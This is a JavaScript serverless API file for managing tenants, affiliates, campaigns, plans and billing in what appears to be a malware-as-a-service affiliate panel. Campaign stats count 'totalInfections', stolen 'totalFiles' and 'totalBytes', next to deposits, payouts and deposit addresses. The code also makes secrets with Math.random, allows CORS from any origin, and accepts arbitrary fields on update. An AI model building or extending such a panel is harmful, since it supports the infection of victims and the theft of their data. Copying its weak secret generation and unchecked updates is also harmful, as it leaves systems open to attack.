// vercel-dashboard/api/tenants/index.js
// Multi-Tenant Management API

import { kv } from '../../lib/kv.js';

export default async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (request.method === 'OPTIONS') return response.status(200).end();

  try {
    const auth = await verifyAuth(request);
    if (!auth.valid) return response.status(401).json({ error: 'Unauthorized' });

    // Only admins can manage tenants
    if (auth.role !== 'admin') {
      return response.status(403).json({ error: 'Admin access required' });
    }

    switch (request.method) {
      case 'GET':
        return await handleGet(request, response);
      case 'POST':
        return await handlePost(request, response);
      case 'PUT':
        return await handlePut(request, response);
      case 'DELETE':
        return await handleDelete(request, response);
      default:
        return response.status(405).json({ error: 'Method not allowed' });
    }
  } catch (error) {
    console.error('Tenants API error:', error);
    return response.status(500).json({ error: 'Internal server error' });
  }
}

// GET /api/tenants - List tenants or get single tenant
async function handleGet(request, response) {
  const { id, includeStats, includeAffiliates, includeCampaigns, limit = 50, offset = 0 } = request.query;

  if (id) {
    const tenant = await kv.get(`tenant:${id}`);
    if (!tenant) return response.status(404).json({ error: 'Tenant not found' });

    // Remove sensitive fields
    const { apiSecret, webhookSecret, ...safeTenant } = tenant;

    if (includeStats === 'true') {
      const stats = await kv.hgetall(`tenant:${id}:stats`);
      safeTenant.stats = stats || {};
    }

    if (includeAffiliates === 'true') {
      const affiliateIds = await kv.smembers(`tenant:${id}:affiliates`) || [];
      const affiliates = [];
      for (const aid of affiliateIds.slice(0, 100)) {
        const a = await kv.get(`affiliate:${aid}`);
        if (a) {
          const { passwordHash, apiSecret, twoFASecret, ...safeAffiliate } = a;
          const stats = await kv.hgetall(`affiliate:${aid}:stats`);
          safeAffiliate.stats = stats || {};
          affiliates.push(safeAffiliate);
        }
      }
      safeTenant.affiliates = affiliates;
    }

    if (includeCampaigns === 'true') {
      const campaignIds = await kv.smembers(`tenant:${id}:campaigns`) || [];
      const campaigns = [];
      for (const cid of campaignIds.slice(0, 100)) {
        const c = await kv.get(`campaign:${cid}`);
        if (c) {
          const stats = await kv.hgetall(`campaign:${cid}:stats`);
          campaigns.push({
            id: c.id,
            name: c.name,
            status: c.status,
            createdAt: c.createdAt,
            stats: {
              totalInfections: parseInt(stats?.totalInfections || '0'),
              totalFiles: parseInt(stats?.totalFiles || '0'),
              totalBytes: parseInt(stats?.totalBytes || '0'),
              lastActivity: stats?.lastActivity
            }
          });
        }
      }
      safeTenant.campaigns = campaigns;
    }

    return response.json(safeTenant);
  }

  // List all tenants
  const tenantIds = await kv.smembers('global:tenants') || [];
  const tenants = [];

  for (const tid of tenantIds) {
    const t = await kv.get(`tenant:${tid}`);
    if (t) {
      const stats = await kv.hgetall(`tenant:${tid}:stats`);
      const affiliateCount = (await kv.scard(`tenant:${tid}:affiliates`)) || 0;
      const campaignCount = (await kv.scard(`tenant:${tid}:campaigns`)) || 0;
      tenants.push({
        id: t.id,
        name: t.name,
        domain: t.domain,
        status: t.status,
        plan: t.plan,
        createdAt: t.createdAt,
        expiresAt: t.expiresAt,
        affiliateCount,
        campaignCount,
        stats: {
          totalRevenue: parseFloat(stats?.totalRevenue || '0'),
          totalDeposits: parseFloat(stats?.totalDeposits || '0'),
          totalPayouts: parseFloat(stats?.totalPayouts || '0'),
          balance: parseFloat(stats?.balance || '0'),
          activeAffiliates: parseInt(stats?.activeAffiliates || '0')
        }
      });
    }
  }

  // Sort by creation date (newest first)
  tenants.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));

  // Paginate
  const start = parseInt(offset);
  const lim = parseInt(limit);
  const paginated = tenants.slice(start, start + lim);

  response.json({
    tenants: paginated,
    total: tenants.length,
    page: Math.floor(start / lim) + 1,
    pageSize: lim
  });
}

// POST /api/tenants - Create new tenant
async function handlePost(request, response) {
  const { 
    name, 
    domain, 
    email, 
    plan = 'starter',
    adminAffiliateId, // Optional: existing affiliate to make admin
    settings = {}
  } = request.body;

  if (!name) return response.status(400).json({ error: 'Tenant name required' });
  if (!domain) return response.status(400).json({ error: 'Domain required' });
  if (!email) return response.status(400).json({ error: 'Admin email required' });

  // Check domain uniqueness
  const existingDomain = await kv.get(`tenant:domain:${domain}`);
  if (existingDomain) return response.status(409).json({ error: 'Domain already in use' });

  // Check email uniqueness
  const existingEmail = await kv.get(`tenant:email:${email}`);
  if (existingEmail) return response.status(409).json({ error: 'Email already registered' });

  const id = `tenant_${Date.now()}_${Math.random().toString(36).substring(7)}`;
  const apiKey = `tk_${Math.random().toString(36).substring(2, 15)}${Math.random().toString(36).substring(2, 10)}`;
  const apiSecret = `ts_${Math.random().toString(36).substring(2, 15)}${Math.random().toString(36).substring(2, 15)}`;
  const webhookSecret = `whs_${Math.random().toString(36).substring(2, 30)}`;

  const now = new Date().toISOString();
  const expiresAt = new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(); // 1 year

  const planLimits = getPlanLimits(plan);

  const tenant = {
    id,
    name,
    domain: domain.toLowerCase(),
    email,
    apiKey,
    apiSecret,
    webhookSecret,
    status: 'active',
    plan,
    planLimits,
    createdAt: now,
    updatedAt: now,
    expiresAt,
    settings: {
      customBranding: plan !== 'starter',
      customDomain: plan !== 'starter',
      whiteLabel: plan === 'enterprise',
      apiAccess: plan !== 'starter',
      webhooksEnabled: true,
      maxAffiliates: planLimits.maxAffiliates,
      maxCampaigns: planLimits.maxCampaigns,
      maxStorageGB: planLimits.maxStorageGB,
      ...settings
    },
    billing: {
      cycle: 'monthly',
      amount: planLimits.price,
      currency: 'USD',
      nextBillingDate: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(),
      paymentMethod: null,
      invoices: []
    },
    features: {
      affiliateProgram: true,
      multiLevelReferrals: plan !== 'starter',
      customCommissionRates: plan === 'enterprise',
      dedicatedSupport: plan === 'enterprise',
      sla: plan === 'enterprise' ? '99.9%' : '99%',
      apiRateLimit: planLimits.apiRateLimit
    }
  };

  // Save tenant
  const operations = [
    kv.set(`tenant:${id}`, tenant),
    kv.set(`tenant:domain:${domain}`, id),
    kv.set(`tenant:email:${email}`, id),
    kv.sadd('global:tenants', id),
    kv.hset(`tenant:${id}:stats`, {
      totalRevenue: 0,
      totalDeposits: 0,
      totalPayouts: 0,
      balance: 0,
      activeAffiliates: 0,
      totalAffiliates: 0,
      totalCampaigns: 0,
      totalInfections: 0
    })
  ];

  // If admin affiliate provided, associate
  if (adminAffiliateId) {
    const affiliate = await kv.get(`affiliate:${adminAffiliateId}`);
    if (affiliate) {
      operations.push(
        kv.set(`affiliate:${adminAffiliateId}`, { ...affiliate, tenantId: id, role: 'tenant_admin' }),
        kv.sadd(`tenant:${id}:affiliates`, adminAffiliateId),
        kv.hincrby(`tenant:${id}:stats`, 'totalAffiliates', 1),
        kv.hincrby(`tenant:${id}:stats`, 'activeAffiliates', 1)
      );
    }
  }

  await Promise.all(operations);

  // Return without sensitive data
  const { apiSecret: _, webhookSecret: __, ...safeTenant } = tenant;
  response.status(201).json(safeTenant);
}

// PUT /api/tenants - Update tenant
async function handlePut(request, response) {
  const { id, ...updates } = request.body;
  if (!id) return response.status(400).json({ error: 'Tenant ID required' });

  const existing = await kv.get(`tenant:${id}`);
  if (!existing) return response.status(404).json({ error: 'Tenant not found' });

  // Handle plan changes
  if (updates.plan && updates.plan !== existing.plan) {
    const newLimits = getPlanLimits(updates.plan);
    updates.planLimits = newLimits;
    updates.features = { ...existing.features, ...getPlanFeatures(updates.plan) };
    updates.settings = { ...existing.settings, maxAffiliates: newLimits.maxAffiliates, maxCampaigns: newLimits.maxCampaigns, maxStorageGB: newLimits.maxStorageGB };
    updates.billing = { ...existing.billing, amount: newLimits.price };
  }

  // Handle domain change
  if (updates.domain && updates.domain !== existing.domain) {
    const domainExists = await kv.get(`tenant:domain:${updates.domain}`);
    if (domainExists) return response.status(409).json({ error: 'Domain already in use' });
    await kv.del(`tenant:domain:${existing.domain}`);
    await kv.set(`tenant:domain:${updates.domain}`, id);
  }

  // Handle email change
  if (updates.email && updates.email !== existing.email) {
    const emailExists = await kv.get(`tenant:email:${updates.email}`);
    if (emailExists) return response.status(409).json({ error: 'Email already in use' });
    await kv.del(`tenant:email:${existing.email}`);
    await kv.set(`tenant:email:${updates.email}`, id);
  }

  const updated = {
    ...existing,
    ...updates,
    id,
    updatedAt: new Date().toISOString()
  };

  await kv.set(`tenant:${id}`, updated);

  const { apiSecret, webhookSecret, ...safeUpdated } = updated;
  response.json(safeUpdated);
}

// DELETE /api/tenants - Delete tenant (with data cleanup)
async function handleDelete(request, response) {
  const { id, confirm, force } = request.query;
  if (!id) return response.status(400).json({ error: 'Tenant ID required' });
  if (confirm !== 'true' && !force) return response.status(400).json({ error: 'Confirmation required' });

  const existing = await kv.get(`tenant:${id}`);
  if (!existing) return response.status(404).json({ error: 'Tenant not found' });

  // Clean up all tenant data
  const cleanup = [
    kv.del(`tenant:${id}`),
    kv.del(`tenant:domain:${existing.domain}`),
    kv.del(`tenant:email:${existing.email}`),
    kv.del(`tenant:${id}:stats`),
    kv.srem('global:tenants', id)
  ];

  // Clean up affiliates
  const affiliateIds = await kv.smembers(`tenant:${id}:affiliates`) || [];
  for (const aid of affiliateIds) {
    cleanup.push(
      kv.set(`affiliate:${aid}`, { ...(await kv.get(`affiliate:${aid}`)), tenantId: null, role: 'affiliate' }),
      kv.srem(`tenant:${id}:affiliates`, aid)
    );
  }
  cleanup.push(kv.del(`tenant:${id}:affiliates`));

  // Clean up campaigns
  const campaignIds = await kv.smembers(`tenant:${id}:campaigns`) || [];
  for (const cid of campaignIds) {
    // Don't delete campaigns, just remove tenant association
    const campaign = await kv.get(`campaign:${cid}`);
    if (campaign) {
      cleanup.push(
        kv.set(`campaign:${cid}`, { ...campaign, tenantId: null })
      );
    }
  }
  cleanup.push(kv.del(`tenant:${id}:campaigns`));

  // Clean up payments
  const paymentIds = await kv.smembers(`tenant:${id}:payments`) || [];
  for (const pid of paymentIds) {
    cleanup.push(kv.srem('global:payments', pid));
  }
  cleanup.push(kv.del(`tenant:${id}:payments`));

  // Clean up deposit addresses
  cleanup.push(kv.del(`tenant:${id}:deposit_addresses`));

  await Promise.all(cleanup);

  response.json({ success: true, deleted: id, cleanedAffiliates: affiliateIds.length, cleanedCampaigns: campaignIds.length });
}

// ============ PLAN CONFIGURATION ============
function getPlanLimits(plan) {
  const plans = {
    starter: {
      price: 29,
      maxAffiliates: 10,
      maxCampaigns: 5,
      maxStorageGB: 10,
      apiRateLimit: 100 // req/min
    },
    professional: {
      price: 99,
      maxAffiliates: 100,
      maxCampaigns: 50,
      maxStorageGB: 100,
      apiRateLimit: 1000
    },
    business: {
      price: 299,
      maxAffiliates: 1000,
      maxCampaigns: 500,
      maxStorageGB: 1000,
      apiRateLimit: 5000
    },
    enterprise: {
      price: 999,
      maxAffiliates: -1, // unlimited
      maxCampaigns: -1,
      maxStorageGB: -1,
      apiRateLimit: 50000
    }
  };
  return plans[plan] || plans.starter;
}

function getPlanFeatures(plan) {
  const features = {
    starter: {
      affiliateProgram: true,
      multiLevelReferrals: false,
      customCommissionRates: false,
      dedicatedSupport: false,
      sla: '99%',
      apiRateLimit: 100
    },
    professional: {
      affiliateProgram: true,
      multiLevelReferrals: true,
      customCommissionRates: false,
      dedicatedSupport: false,
      sla: '99.5%',
      apiRateLimit: 1000
    },
    business: {
      affiliateProgram: true,
      multiLevelReferrals: true,
      customCommissionRates: true,
      dedicatedSupport: true,
      sla: '99.9%',
      apiRateLimit: 5000
    },
    enterprise: {
      affiliateProgram: true,
      multiLevelReferrals: true,
      customCommissionRates: true,
      dedicatedSupport: true,
      sla: '99.99%',
      apiRateLimit: 50000
    }
  };
  return features[plan] || features.starter;
}

// ============ AUTH VERIFICATION ============
async function verifyAuth(request) {
  const authHeader = request.headers['authorization']?.replace('Bearer ', '');
  if (!authHeader) return { valid: false };

  if (authHeader === process.env.MASTER_API_KEY) {
    return { valid: true, role: 'admin', tenantId: null, affiliateId: null };
  }

  // Check tenant API key
  const tenantIds = await kv.smembers('global:tenants') || [];
  for (const tid of tenantIds) {
    const tenant = await kv.get(`tenant:${tid}`);
    if (tenant && tenant.apiKey === authHeader) {
      return { valid: true, role: 'tenant', tenantId: tid, affiliateId: null };
    }
  }

  // Check session (affiliate)
  const session = await kv.get(`session:${authHeader}`);
  if (session && new Date(session.expiresAt) > new Date()) {
    const affiliate = await kv.get(`affiliate:${session.affiliateId}`);
    return { 
      valid: true, 
      role: affiliate?.role === 'tenant_admin' ? 'tenant_admin' : 'affiliate',
      affiliateId: session.affiliateId,
      tenantId: affiliate?.tenantId || null
    };
  }

  // Check affiliate API key
  const affiliateIds = await kv.smembers('global:affiliates') || [];
  for (const aid of affiliateIds) {
    const a = await kv.get(`affiliate:${aid}`);
    if (a && a.apiKey === authHeader) {
      return { valid: true, role: a.role || 'affiliate', affiliateId: aid, tenantId: a.tenantId || null };
    }
  }

  return { valid: false };
}
